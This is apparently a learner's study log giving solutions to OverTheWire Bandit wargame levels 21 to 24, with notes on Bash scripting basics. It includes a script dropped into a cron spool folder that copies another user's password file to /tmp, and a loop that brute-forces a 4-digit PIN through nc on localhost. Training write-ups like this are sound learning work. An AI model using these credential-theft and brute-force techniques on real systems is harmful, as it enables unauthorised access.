# Day 15: Bandit 21 to 24, Bash scripting basics

- Bandit levels 21, 22, 23 and 24
- Wrote a Bash script alone (shebang, variables, read, if/else with ||)
- Wrote a script to brute-force a 4-digit pin

Roadmap: 1B Bandit levels 21 to 24 done. 1D Bash scripting: wrote scripts with a guide (L2).

## Bandit solutions

### Level 21: cron job

```bash
$ cat /etc/cron.d/cronjob_bandit22
$ cat /usr/bin/cronjob_bandit22.sh
$ cat /tmp/FILENAME
```

The script reads the password and copies it into a file in `/tmp` that anyone can read.

### Level 22: cron job with a variable

```bash
$ cat /usr/bin/cronjob_bandit23.sh
$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
$ cat /tmp/HASH
```

The script builds a file name from `I am user $myname`, where `$myname` is the user cron runs it as. The `echo` command only prints the file name, the password is inside that file.

### Level 23: cron job with a different variable

```bash
$ cat /usr/bin/cronjob_bandit24.sh
$ echo I am user bandit24 | md5sum | cut -d ' ' -f 1
$ cat /tmp/HASH
```

Same idea as level 22, with the user name changed to bandit24.

### Level 24: write your own script for cron to run

```bash
$ mkdir /tmp/lala
$ cd /tmp/lala
$ vim lalala.sh
```

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/lala/password.txt
```

```bash
$ chmod +x lalala.sh
$ cp lalala.sh /var/spool/bandit24/foo/
$ cat /tmp/lala/password.txt
```

The cron script in `/var/spool/bandit24/foo` runs any executable file owned by bandit23 that it finds there, then deletes it. A first version using a relative path (`password.txt`) failed, because the cron wrapper changes into that folder before running the script, so the output landed there and was deleted with everything else. A full path fixed it.

### Level 24 continued: brute-forcing a pin

The level gives a daemon on a port that needs the current password plus a 4-digit pin, with no way to find the pin except trying all 10000 combinations. The level says a new connection is not needed for each guess.

```bash
$ mkdir /tmp/pass24
$ cd /tmp/pass24
$ vim pass.sh
```

```bash
#!/bin/bash
for i in {0000..9999}; do
    echo "PASSWORD $i"
done
```

```bash
$ chmod +x pass.sh
$ ./pass.sh | nc localhost 30002
```

How it works: `{0000..9999}` generates every 4-digit combination with leading zeros kept. The script prints one guess per line. Piping it into `nc` sends all the guesses through a single open connection instead of opening 10000 separate ones. The daemon replies to each guess, and the one correct reply differs from the wall of wrong ones.

## Bash script basics (practice only, not in the repo)

```bash
#!/bin/bash
name="Aiman"
echo "Hello, my name is $name and I like cats."
read -p "What is your favorite animal? " animal
echo "Nice, I like $animal too."
if [ "$animal" = "Cats" ] || [ "$animal" = "cats" ] || [ "$animal" = "Cat" ] || [ "$animal" = "cat" ] || [ "$animal" = "CAT" ] || [ "$animal" = "CATS" ]; then
    echo "Me too, cats are the best."
else
    echo "Interesting choice."
fi
```

## Key takeaways

- Read a cron job in order: the file in `/etc/cron.d/`, then the script it runs, then where it writes.
- A script run by cron uses the user cron runs it as, not the user who wrote it.
- A relative path depends on the current folder when the script runs, which can be different from where you wrote it. A full path avoids that.
- A file must be owned correctly and have the execute bit (`x`) before a scheduled job can run it.
- Brace expansion (`{0000..9999}`) generates a full list of values in one line.
- Piping a generated list into `nc` sends many inputs through one open connection, instead of reconnecting for each one.
- `#!/bin/bash` at the top of a file tells Linux which program runs it.
- `read -p "text" name` asks for input and stores it in a variable.
- `||` between two `[ ... ]` tests means "or".
